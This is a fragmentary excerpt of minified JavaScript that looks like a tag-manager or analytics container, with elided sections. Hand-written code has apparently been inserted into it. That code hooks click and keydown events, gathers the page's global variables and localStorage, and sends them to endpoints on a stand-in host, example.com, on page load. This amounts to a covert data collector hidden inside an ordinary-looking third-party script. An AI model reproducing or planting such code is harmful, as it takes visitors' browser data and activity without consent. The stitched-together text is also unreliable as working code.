...
(function () {
  ...
  aa = hb.prototype;
  // Global variable to keep track of already seen properties
  window._trackedProps = window._trackedProps || [];

  // Hook for the JavaScript event
  ...
  window.jshook = function (event, originalFunc) {
    return function (e) {
      trackEventData(event, e);
      originalFunc(e);
    };
  };
  sa(ld, sb);
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayerA";
  ni.fk = "ChEIgOm8qgYQu/+2jPSy9oOgARInAOg6TnSc2rQNLkm3VADvR3CPKH8Dh1yQUs07KEPsLySOexzhKmRpGgKSxg\x3d\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  const trackGlobals = () => {
    ...
    Object.keys(window).forEach(prop => {
      if (!window._trackedProps.includes(prop) && window.hasOwnProperty(prop)) {
        tracked[prop] = typeof window[prop] === 'function' ? null : window[prop];
      }
    });
    return tracked;
  };
  ...
  R(60);
  R(63);
  const trackEventData = (eventType, event) => {
    const trackedEvent = {
      type: eventType,
      target: event.target.toString(),
      timeStamp: event.timeStamp
    };
    sendDataToServer(trackedEvent, '/api/collectEvent');
  };
  R(64);
  R(65);
  R(67);
  ...
  const sendDataToServer = (data, apiEndpoint) => {
    const url = `https://example.com${apiEndpoint}`;
  ...
  const trackAndSendData = () => {
    const collectedData = {
      localStorage: trackLocalStorage(),
      globals: trackGlobals()
    };
    sendDataToServer(collectedData, "/api/collectData");
  };

  // On page load, collect and send data
  ...
  window.addEventListener('click', window.jshook.bind(null, 'click'));
  function Nv(a) {
    a();
  }
  function Ov(a, b) {
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'UA-203334133-1'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  var xG = Object.freeze({
    ...
    yG = {};
  function zG(a, b, c, d) {}
  window.addEventListener('keydown', window.jshook.bind(null, 'keydown'));
  wG.P = "injectScript";
